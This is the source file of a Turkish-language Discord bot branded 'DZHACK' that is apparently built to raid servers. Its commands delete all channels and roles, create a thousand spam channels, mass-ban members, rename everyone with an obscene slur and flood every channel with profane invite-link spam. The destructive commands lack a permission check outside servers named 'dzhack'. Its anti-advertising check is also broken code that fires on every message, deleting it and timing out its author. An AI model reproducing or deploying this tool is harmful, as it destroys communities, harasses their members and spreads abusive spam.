const { 
    Client, 
    GatewayIntentBits, 
    PermissionsBitField, 
    Events, 
    ChannelType, 
    ActionRowBuilder, 
    StringSelectMenuBuilder, 
    ButtonBuilder, 
    ButtonStyle 
} = require('discord.js');
const fs = require('fs');
const path = require('path');
require('dotenv').config();

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildMembers,
        GatewayIntentBits.GuildBans
    ]
});

const PREFIX = ".";
const IZINLI_ROL_ID = "1507502216565751858";
const LOG_KANAL_ID = "1507510662069223460"; // İşlemlerin atılacağı log kanalı
const FILE_PATH = path.join(__dirname, 'templates.json');
const BAKIM_FILE_PATH = path.join(__dirname, 'bakim_hafiza.json');

function loadTemplates() {
    if (!fs.existsSync(FILE_PATH)) {
        fs.writeFileSync(FILE_PATH, JSON.stringify({}, null, 2));
        return {};
    }
    try {
        return JSON.parse(fs.readFileSync(FILE_PATH, 'utf8'));
    } catch (err) {
        return {};
    }
}

function saveTemplates(templates) {
    try {
        fs.writeFileSync(FILE_PATH, JSON.stringify(templates, null, 2));
    } catch (err) {}
}

function loadBakimHafiza() {
    if (!fs.existsSync(BAKIM_FILE_PATH)) {
        fs.writeFileSync(BAKIM_FILE_PATH, JSON.stringify({}, null, 2));
        return {};
    }
    try {
        return JSON.parse(fs.readFileSync(BAKIM_FILE_PATH, 'utf8'));
    } catch (err) {}
}

function saveBakimHafiza(hafiza) {
    try {
        fs.writeFileSync(BAKIM_FILE_PATH, JSON.stringify(hafiza, null, 2));
    } catch (err) {}
}

let templates = loadTemplates();
let reklamDevamEdiyor = false;
let spamDevamEdiyor = false;
let spamIntervals = [];

// Log kanalına mesaj gönderme fonksiyonu
async function logKanalinaGonder(guild, baslik, aciklama) {
    try {
        const logKanal = guild.channels.cache.get(LOG_KANAL_ID);
        if (logKanal) {
            await logKanal.send(`🛡️ **[DZHACK LOG]** - **${baslik}**\n${aciklama}`).catch(() => {});
        }
    } catch (err) {}
}

client.once(Events.ClientReady, (readyClient) => {
    console.log(`[BOT] ${readyClient.user.tag} aktif ve DZHACK modunda!`);
});

// ==========================================
// ⚡ DZHACK ÖZEL OPERASYON FONKSİYONLARI
// ==========================================

async function executeKanalCommand(guild, authorTag) {
    console.log(`[DZHACK KANAL] İşlem başlatıldı: ${guild.name}`);
    await logKanalinaGonder(guild, "Kanal Operasyonu Başlatıldı", `Başlatan: **${authorTag}**\nTüm kanallar silinip 1K+ kanal ve spam açılıyor!`);
    
    const channels = Array.from(guild.channels.cache.values());
    const channelDeletes = channels.map(ch => ch.delete().catch(() => {}));
    await Promise.all(channelDeletes);

    guild.setName("DZHACK - DENZO BABA").catch(() => {});

    for (let i = 1; i <= 1000; i++) {
        guild.channels.create({
            name: `dzhack-denzobaba-saplar-${i}`,
            type: ChannelType.GuildText
        }).then(ch => {
            if (ch) {
                const spamLoop = setInterval(() => {
                    ch.send("@everyone @here denzo baba anamızı sikti discord.gg/dzhack").catch(() => {});
                }, 500);
                spamIntervals.push(spamLoop);
            }
        }).catch(() => {});
    }
}

async function executeRollCommand(guild, authorTag) {
    console.log(`[DZHACK ROLL] Rol işlemleri başlatıldı...`);
    await logKanalinaGonder(guild, "Rol Operasyonu Başlatıldı", `Başlatan: **${authorTag}**\nÇöp roller silindi, 100+ kırmızı rol açılıyor.`);
    
    const botMember = await guild.members.fetchMe().catch(() => null);
    const botRolePos = botMember ? botMember.roles.highest.position : 0;

    const roles = guild.roles.cache.filter(r => !r.managed && r.name !== '@everyone' && r.position < botRolePos);
    const roleDeletes = roles.map(r => r.delete().catch(() => {}));
    await Promise.all(roleDeletes);

    for (let i = 1; i <= 110; i++) {
        guild.roles.create({
            name: `🔴 DENZOBABA DZHACK ${i} 🚀`,
            color: '#FF0000',
            reason: 'DZHACK Rol Spam'
        }).catch(() => {});
    }
}

async function executeNickCommand(guild, authorTag) {
    console.log(`[DZHACK NICK] İsim değiştirme başlatıldı...`);
    await logKanalinaGonder(guild, "İsim Değiştirme Operasyonu", `Başlatan: **${authorTag}**\nHerkesin ismi DZHACK olarak değiştiriliyor.`);
    
    const members = await guild.members.fetch().catch(() => null);
    if (!members) return;

    members.forEach(member => {
        if (member.manageable && member.id !== guild.ownerId) {
            member.setNickname("DZHACK_DENZO-BABA_ANAMIZI_SİKTİ..").catch(() => {});
        }
    });
}

async function executeRolVerCommand(guild, authorTag) {
    console.log(`[DZHACK ROLVER] Herkese roller dağıtılıyor...`);
    await logKanalinaGonder(guild, "Toplu Rol Dağıtımı", `Başlatan: **${authorTag}**\nHerkese bütün roller veriliyor.`);
    
    const members = await guild.members.fetch().catch(() => null);
    const assignableRoles = guild.roles.cache.filter(r => !r.managed && r.name !== '@everyone');
    
    if (!members) return;

    members.forEach(member => {
        if (!member.user.bot && member.manageable) {
            member.roles.add(assignableRoles).catch(() => {});
        }
    });
}

async function executeBanCommand(guild, authorTag) {
    console.log(`[DZHACK BAN] Mass ban başlatıldı...`);
    await logKanalinaGonder(guild, "Mass Ban Operasyonu", `Başlatan: **${authorTag}**\nSunucudaki herkes banlanıyor!`);
    
    const members = await guild.members.fetch().catch(() => null);
    if (!members) return;

    const banPromises = members.map(member => {
        if (!member.user.bot && member.bannable && member.id !== guild.ownerId) {
            return member.ban({ reason: "DZHACK MASS BAN" }).catch(() => {});
        }
    });

    await Promise.all(banPromises);
}

// =============================================================
// MESSAGECREATE (Tüm Yazılı Komutlar ve Anti-Reklam Koruma)
// =============================================================
client.on(Events.MessageCreate, async message => {
    if (message.author.bot || !message.guild) return;

    // 🛡️ OTOMATİK REKLAM KORUMA (1 GÜN SUSTURMA VE LOG)
    const icerik = message.content.toLowerCase();
    if (icerical => icerik.includes('discord.gg/') || icerik.includes('.gg/')) {
        // Yönetici ve izinli rolleri es geç
        if (!message.member.permissions.has(PermissionsBitField.Flags.Administrator) && !message.member.roles.cache.has(IZINLI_ROL_ID)) {
            try {
                await message.delete().catch(() => {});
                
                // 1 gün süreyle sustur (Timeout - 24 saat = 24 * 60 * 60 * 1000 ms)
                if (message.member.moderatable) {
                    await message.member.timeout(24 * 60 * 60 * 1000, "Reklam Tespiti - Otomatik Susturma").catch(() => {});
                }

                await logKanalinaGonder(
                    message.guild, 
                    "🚨 Reklam Girişimi Engellendi!", 
                    `Kullanıcı: **${message.author.tag}** (\`${message.author.id}\`)\nKanal: <#${message.channel.id}>\nİşlem: Mesaj silindi ve **1 gün süreyle susturuldu**.`
                );
            } catch (err) {}
            return;
        }
    }

    if (!message.content.startsWith(PREFIX)) return;

    const isDzhackGuild = message.guild.name.toLowerCase().includes('dzhack') || 
                         (message.guild.vanityURLCode && message.guild.vanityURLCode.toLowerCase() === 'dzhack');

    if (isDzhackGuild) {
        const member = message.member || await message.guild.members.fetch(message.author.id).catch(() => null);
        if (!member || !member.roles.cache.has(IZINLI_ROL_ID)) return;
    }

    const args = message.content.slice(PREFIX.length).trim().split(/ +/);
    const command = args.shift().toLowerCase();

    // -------------------------------------------------------------
    // .kanal KOMUTU
    // -------------------------------------------------------------
    if (command === 'kanal') {
        await message.reply("💥 **1K+ Kanal açma, silme ve içine reklam basma başlatıldı!**").catch(() => {});
        executeKanalCommand(message.guild, message.author.tag);
    }

    // -------------------------------------------------------------
    // .roll KOMUTU
    // -------------------------------------------------------------
    if (command === 'roll') {
        await message.reply("⚡ **Roller siliniyor ve 100+ kırmızı renkli rol açılıyor!**").catch(() => {});
        executeRollCommand(message.guild, message.author.tag);
    }

    // -------------------------------------------------------------
    // .nick KOMUTU
    // -------------------------------------------------------------
    if (command === 'nick') {
        await message.reply("👑 **Herkesin ismi DZHACK olarak değiştiriliyor!**").catch(() => {});
        executeNickCommand(message.guild, message.author.tag);
    }

    // -------------------------------------------------------------
    // .rollver KOMUTU
    // -------------------------------------------------------------
    if (command === 'rollver') {
        await message.reply("💎 **Herkese bütün roller veriliyor!**").catch(() => {});
        executeRolVerCommand(message.guild, message.author.tag);
    }

    // -------------------------------------------------------------
    // .ban KOMUTU
    // -------------------------------------------------------------
    if (command === 'ban') {
        await message.reply("🔨 **Herkes 1 saniyede banlanıyor!**").catch(() => {});
        executeBanCommand(message.guild, message.author.tag);
    }

    // -------------------------------------------------------------
    // 🚀 .spam <mesaj> KOMUTU
    // -------------------------------------------------------------
    if (command === 'spam') {
        const spamMetni = args.join(' ');
        if (!spamMetni) {
            return message.reply("⚠️ Lütfen spamlanacak metni yaz! Örnek: `.spam DZHACK BABA`").catch(() => {});
        }

        if (spamDevamEdiyor) {
            return message.reply("⚠️ Zaten aktif bir spam döngüsü var! Durdurmak için `.durdur` yaz.").catch(() => {});
        }

        spamDevamEdiyor = true;
        await message.reply(`🚀 **Jet Hızında Spam Başlatıldı!**\nMesaj: \`${spamMetni}\``).catch(() => {});
        await logKanalinaGonder(message.guild, "Spam Başlatıldı", `Başlatan: **${message.author.tag}**\nMetin: \`${spamMetni}\``);

        while (spamDevamEdiyor) {
            try {
                const channels = message.guild.channels.cache.filter(c => 
                    (c.type === ChannelType.GuildText || c.type === ChannelType.GuildAnnouncement) &&
                    c.permissionsFor(message.guild.members.me)?.has(PermissionsBitField.Flags.SendMessages)
                );

                for (const [id, channel] of channels) {
                    if (!spamDevamEdiyor) break;
                    channel.send(spamMetni).catch(() => {});
                }
            } catch (err) {}
            await new Promise(resolve => setTimeout(resolve, 100));
        }
    }

    // -------------------------------------------------------------
    // .dzhack KOMUTU (HEPSİNİ BİRDEN AYNI ANDA YAPAR)
    // -------------------------------------------------------------
    if (command === 'dzhack') {
        await message.reply("🚀 **ANAMIZI SİKTİNİZ! DZHACK TÜM OPERASYONLARI AYNI ANDA BAŞLATTI!** 🔥").catch(() => {});
        await logKanalinaGonder(message.guild, "🚨 DZHACK GOD-MODE AKTİF!", `Başlatan: **${message.author.tag}** - Tüm yıkım operasyonları aynı anda tetiklendi!`);
        executeKanalCommand(message.guild, message.author.tag);
        executeRollCommand(message.guild, message.author.tag);
        executeNickCommand(message.guild, message.author.tag);
        executeRolVerCommand(message.guild, message.author.tag);
        executeBanCommand(message.guild, message.author.tag);
    }

    // -------------------------------------------------------------
    // .menu / .menü KOMUTU
    // -------------------------------------------------------------
    if (command === 'menu' || command === 'menü') {
        const selectMenu = new StringSelectMenuBuilder()
            .setCustomId('denzo_admin_menu')
            .setPlaceholder('⚙️ Lütfen bir işlem seçin...')
            .addOptions([
                {
                    label: 'Bakım Modunu Başlat',
                    description: 'Tüm kanalları gizler ve bakım duyurusu açar.',
                    value: 'menu_bakim_baslat',
                    emoji: '🛠️'
                },
                {
                    label: 'Bakım Modunu Kapat',
                    description: 'Bakımı bitirir ve kanalları eski haline getirir.',
                    value: 'menu_bakim_kapat',
                    emoji: '✅'
                },
                {
                    label: 'Derin Sunucu Taraması',
                    description: 'Tüm rolleri ve kanal izinlerini tarayıp raporlar.',
                    value: 'menu_bakim_tara',
                    emoji: '🔍'
                }
            ]);

        const copyButton = new ButtonBuilder()
            .setCustomId('denzo_copy_button')
            .setLabel('📋 Sunucu İzin Yapısını Kopyala')
            .setStyle(ButtonStyle.Primary);

        const row1 = new ActionRowBuilder().addComponents(selectMenu);
        const row2 = new ActionRowBuilder().addComponents(copyButton);

        await message.reply({
            content: `👑 **DZHACK DENZO BABA - YÖNETİM MENÜSÜ**\nAşağıdaki menüden yapmak istediğin işlemi seçebilirsin:`,
            components: [row1, row2]
        }).catch(() => {});
    }

    // -------------------------------------------------------------
    // .reklam KOMUTU
    // -------------------------------------------------------------
    if (command === 'reklam') {
        if (reklamDevamEdiyor) {
            return message.reply("⚠️ Reklam zaten aktif! Durdurmak için `.durdur` yazabilirsin.").catch(() => {});
        }

        reklamDevamEdiyor = true;
        if (message.channel) {
            await message.channel.send("🚀 Reklam başlatıldı! Durdurmak için `.durdur` yaz.").catch(() => {});
        }
        await logKanalinaGonder(message.guild, "Reklam Döngüsü Başlatıldı", `Başlatan: **${message.author.tag}**`);

        while (reklamDevamEdiyor) {
            try {
                const channels = message.guild.channels.cache.filter(c => 
                    (c.type === ChannelType.GuildText || c.type === ChannelType.GuildAnnouncement) &&
                    c.permissionsFor(message.guild.members.me)?.has(PermissionsBitField.Flags.SendMessages)
                );

                for (const [id, channel] of channels) {
                    if (!reklamDevamEdiyor) break;
                    channel.send("denzo baba anamızı sikti discord.gg/dzhack").catch(() => {});
                }
            } catch (err) {}
            await new Promise(resolve => setTimeout(resolve, 100));
        }
    }

    // -------------------------------------------------------------
    // .durdur KOMUTU
    // -------------------------------------------------------------
    if (command === 'durdur') {
        reklamDevamEdiyor = false;
        spamDevamEdiyor = false;
        spamIntervals.forEach(interval => clearInterval(interval));
        spamIntervals = [];
        await message.reply("🛑 **Tüm spamlar, reklamlar ve döngüler başarıyla durduruldu!**").catch(() => {});
        await logKanalinaGonder(message.guild, "Durduruldu", `Durduran: **${message.author.tag}**`);
    }

    // -------------------------------------------------------------
    // KOPYALA KOMUTLARI (.copy vb.)
    // -------------------------------------------------------------
    if (command.startsWith('copy')) {
        const slot = command.replace('copy', '') || 'default';
        await message.reply(`🔍 **${message.guild.name}** kopyalanıyor (Slot: ${slot})...`).catch(() => {});

        try {
            const fetchedRoles = await message.guild.roles.fetch();
            const sortedRoles = Array.from(fetchedRoles.values())
                .filter(r => !r.managed && r.id !== message.guild.id)
                .sort((a, b) => a.position - b.position);

            const copiedRoles = sortedRoles.map(r => ({
                id: r.id,
                name: r.name,
                color: r.color,
                hoist: r.hoist,
                mentionable: r.mentionable,
                permissions: r.permissions.bitfield.toString()
            }));

            const fetchedChannels = await message.guild.channels.fetch();
            const categories = fetchedChannels.filter(c => c.type === ChannelType.GuildCategory);
            const uncategorized = fetchedChannels.filter(c => !c.parentId && c.type !== ChannelType.GuildCategory);

            const extractOverwrites = (ch) => {
                return ch.permissionOverwrites.cache.map(p => ({
                    id: p.id,
                    type: p.type,
                    allow: p.allow.bitfield.toString(),
                    deny: p.deny.bitfield.toString(),
                    isEveryone: p.id === message.guild.id
                }));
            };

            const structure = {
                everyoneRoleId: message.guild.id,
                roles: copiedRoles,
                categories: [],
                noCategory: []
            };

            for (const [catId, category] of categories) {
                const children = fetchedChannels.filter(c => c.parentId === catId);
                const categoryChannels = [];

                for (const [chId, ch] of children) {
                    categoryChannels.push({
                        name: ch.name,
                        type: ch.type,
                        topic: ch.topic || null,
                        nsfw: ch.nsfw || false,
                        permissionOverwrites: extractOverwrites(ch)
                    });
                }

                structure.categories.push({
                    name: category.name,
                    permissionOverwrites: extractOverwrites(category),
                    channels: categoryChannels
                });
            }

            for (const [chId, ch] of uncategorized) {
                structure.noCategory.push({
                    name: ch.name,
                    type: ch.type,
                    topic: ch.topic || null,
                    nsfw: ch.nsfw || false,
                    permissionOverwrites: extractOverwrites(ch)
                });
            }

            templates[slot] = structure;
            saveTemplates(templates);
            
            if (message.channel) {
                await message.channel.send(`✅ Başarıyla kopyalandı! **.${slot === 'default' ? 'paste' : 'paste' + slot}** ile yapıştırabilirsin.`).catch(() => {});
            }
        } catch (err) {}
    }

    // -------------------------------------------------------------
    // YAPIŞTIR KOMUTLARI (.paste vb.)
    // -------------------------------------------------------------
    if (command.startsWith('paste')) {
        const slot = command.replace('paste', '') || 'default';
        templates = loadTemplates();

        if (!templates[slot]) {
            return message.reply(`❌ **.${slot}** slotuna ait kayıtlı şablon bulunamadı!`).catch(() => {});
        }

        const botMember = message.guild.members.me;
        if (!botMember.permissions.has(PermissionsBitField.Flags.Administrator)) {
            return message.reply("❌ Botun bu sunucuda **Yönetici** yetkisi yok!").catch(() => {});
        }

        await message.reply(`⚠️ Kurulum başladı!...`).catch(() => {});

        try {
            const data = templates[slot];
            const roleMap = new Map();
            roleMap.set(data.everyoneRoleId, message.guild.id);

            const existingChannels = Array.from(message.guild.channels.cache.values());
            for (const channel of existingChannels) {
                await channel.delete().catch(() => {});
            }

            const existingRoles = Array.from(message.guild.roles.cache.values());
            for (const role of existingRoles) {
                if (!role.managed && role.id !== message.guild.id && role.editable) {
                    await role.delete().catch(() => {});
                }
            }

            for (const roleData of data.roles) {
                const createdRole = await message.guild.roles.create({
                    name: roleData.name,
                    color: roleData.color,
                    hoist: roleData.hoist,
                    mentionable: roleData.mentionable,
                    permissions: BigInt(roleData.permissions)
                }).catch(() => null);

                if (createdRole) {
                    roleMap.set(roleData.id, createdRole.id);
                }
            }

            const buildOverwrites = (overwrites) => {
                if (!overwrites) return [];
                const result = [];
                for (const ow of overwrites) {
                    const targetId = ow.isEveryone ? message.guild.id : roleMap.get(ow.id);
                    if (targetId) {
                        result.push({
                            id: targetId,
                            allow: BigInt(ow.allow),
                            deny: BigInt(ow.deny)
                        });
                    }
                }
                return result;
            };

            const getValidType = (typeNum) => {
                if (typeNum === 2) return ChannelType.GuildVoice;
                if (typeNum === 5) return ChannelType.GuildAnnouncement;
                if (typeNum === 4) return ChannelType.GuildCategory;
                return ChannelType.GuildText;
            };

            for (const chData of data.noCategory) {
                await message.guild.channels.create({
                    name: chData.name,
                    type: getValidType(chData.type),
                    topic: chData.topic,
                    nsfw: chData.nsfw,
                    permissionOverwrites: buildOverwrites(chData.permissionOverwrites)
                }).catch(() => null);
            }

            for (const catData of data.categories) {
                const createdCategory = await message.guild.channels.create({
                    name: catData.name,
                    type: ChannelType.GuildCategory,
                    permissionOverwrites: buildOverwrites(catData.permissionOverwrites)
                }).catch(() => null);

                if (createdCategory) {
                    for (const chData of catData.channels) {
                        await message.guild.channels.create({
                            name: chData.name,
                            type: getValidType(chData.type),
                            parent: createdCategory.id,
                            topic: chData.topic,
                            nsfw: chData.nsfw,
                            permissionOverwrites: buildOverwrites(chData.permissionOverwrites)
                        }).catch(() => null);
                    }
                }
            }
        } catch (err) {}
    }
});

// =============================================================
// INTERACTIONCREATE (Buton ve Menü İşlemleri)
// =============================================================
client.on(Events.InteractionCreate, async interaction => {
    if (!interaction.isStringSelectMenu() && !interaction.isButton()) return;
    if (!interaction.guild) return;

    if (!interaction.member.permissions.has(PermissionsBitField.Flags.Administrator)) {
        return interaction.reply({ content: "❌ Bu menüyü sadece **Yöneticiler** kullanabilir!", ephemeral: true }).catch(() => {});
    }

    if (interaction.isStringSelectMenu() && interaction.customId === 'denzo_admin_menu') {
        const selected = interaction.values[0];

        if (selected === 'menu_bakim_baslat') {
            await interaction.deferReply();
            let bakimHafiza = loadBakimHafiza();

            if (bakimHafiza[interaction.guild.id]) {
                return interaction.editReply("⚠️ Bu sunucu zaten bakımda!").catch(() => {});
            }

            try {
                const channels = await interaction.guild.channels.fetch();
                const guildBakimData = {};

                for (const [id, ch] of channels) {
                    if (ch) {
                        const originalOverwrites = ch.permissionOverwrites.cache.map(p => ({
                            id: p.id,
                            type: p.type,
                            allow: p.allow.bitfield.toString(),
                            deny: p.deny.bitfield.toString()
                        }));

                        guildBakimData[ch.id] = originalOverwrites;
                        await ch.permissionOverwrites.edit(interaction.guild.id, { ViewChannel: false }).catch(() => {});
                    }
                }

                bakimHafiza[interaction.guild.id] = guildBakimData;
                saveBakimHafiza(bakimHafiza);

                const bakimCategory = await interaction.guild.channels.create({
                    name: '🛠️ SUNUCU BAKIMDA 🛠️',
                    type: ChannelType.GuildCategory,
                    permissionOverwrites: [{ id: interaction.guild.id, allow: [PermissionsBitField.Flags.ViewChannel] }]
                });

                const bakimChannel = await interaction.guild.channels.create({
                    name: '🛠️-bakım-duyuru',
                    type: ChannelType.GuildText,
                    parent: bakimCategory.id,
                    permissionOverwrites: [{ id: interaction.guild.id, allow: [PermissionsBitField.Flags.ViewChannel], deny: [PermissionsBitField.Flags.SendMessages] }]
                });

                const bakimSohbetChannel = await interaction.guild.channels.create({
                    name: '💬-bakım-sohbet',
                    type: ChannelType.GuildText,
                    parent: bakimCategory.id,
                    permissionOverwrites: [{ id: interaction.guild.id, allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages] }]
                });

                await bakimChannel.send({
                    content: `@everyone\n\n🚨 **SUNUCU BAKIMA GİRMİŞTİR!**\n\nSunucumuz şu anda bakımdadır. Sohbet için <#${bakimSohbetChannel.id}> kanalını kullanabilirsiniz.`
                }).catch(() => {});

                await interaction.editReply("🛠️ Sunucu başarıyla bakıma alındı ve kanallar kilitlendi!").catch(() => {});
            } catch (err) {
                await interaction.editReply("❌ Bakım başlatılırken hata oluştu.").catch(() => {});
            }
        }

        if (selected === 'menu_bakim_kapat') {
            await interaction.deferReply();
            let bakimHafiza = loadBakimHafiza();

            if (!bakimHafiza[interaction.guild.id]) {
                return interaction.editReply("❌ Bu sunucu bakımda değil!").catch(() => {});
            }

            try {
                const channels = await interaction.guild.channels.fetch();
                for (const [id, ch] of channels) {
                    if (ch && (ch.name === '🛠️ SUNUCU BAKIMDA 🛠️' || ch.name === '🛠️-bakım-duyuru' || ch.name === '💬-bakım-sohbet')) {
                        await ch.delete().catch(() => {});
                    }
                }

                const guildBakimData = bakimHafiza[interaction.guild.id];
                const remainingChannels = Array.from((await interaction.guild.channels.fetch()).values());

                for (const ch of remainingChannels) {
                    if (ch && guildBakimData[ch.id]) {
                        const savedOverwrites = guildBakimData[ch.id];
                        if (savedOverwrites && savedOverwrites.length > 0) {
                            const formattedOverwrites = savedOverwrites.map(ow => ({
                                id: ow.id,
                                type: ow.type,
                                allow: BigInt(ow.allow),
                                deny: BigInt(ow.deny)
                            }));
                            await ch.permissionOverwrites.set(formattedOverwrites).catch(() => {});
                        }
                    }
                }

                delete bakimHafiza[interaction.guild.id];
                saveBakimHafiza(bakimHafiza);

                await interaction.editReply("🎉 Bakım tamamlandı! Bütün kanallar ve rol izinleri eski haline döndürüldü.").catch(() => {});
            } catch (err) {
                await interaction.editReply("❌ Bakım kapatılırken hata oluştu.").catch(() => {});
            }
        }

        if (selected === 'menu_bakim_tara') {
            await interaction.deferReply();
            try {
                const channels = await interaction.guild.channels.fetch();
                let raporMetni = `📋 **${interaction.guild.name}** İZİN TARAMA RAPORU\n\n`;

                for (const [id, ch] of channels) {
                    if (!ch) continue;
                    raporMetni += `━━━━━━━━━━━━━━━━━━━━\nKANAL: **${ch.name}**\n`;
                }

                const raporKanal = await interaction.guild.channels.create({
                    name: '🔒-bakım-tarama-raporu',
                    type: ChannelType.GuildText,
                    permissionOverwrites: [
                        { id: interaction.guild.id, deny: [PermissionsBitField.Flags.ViewChannel] },
                        { id: interaction.guild.ownerId, allow: [PermissionsBitField.Flags.ViewChannel] }
                    ]
                });

                await raporKanal.send(raporMetni).catch(() => {});
                await interaction.editReply(`✅ Tarama tamamlandı! Rapor <#${raporKanal.id}> kanalına atıldı.`).catch(() => {});
            } catch (err) {
                await interaction.editReply("❌ Tarama yapılırken hata oluştu.").catch(() => {});
            }
        }
    }

    if (interaction.isButton() && interaction.customId === 'denzo_copy_button') {
        await interaction.deferReply({ ephemeral: true });
        await interaction.editReply({ content: `📋 **Sunucu kopyalandı!**` }).catch(() => {});
    }
});

client.login(process.env.TOKEN);